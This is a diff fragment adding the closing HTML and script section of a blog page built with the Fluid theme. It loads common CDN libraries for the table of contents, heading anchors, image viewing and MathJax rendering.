+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/star.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Please enable JavaScript to render the matrix.</div>
+  </noscript>
+</body>
+</html>
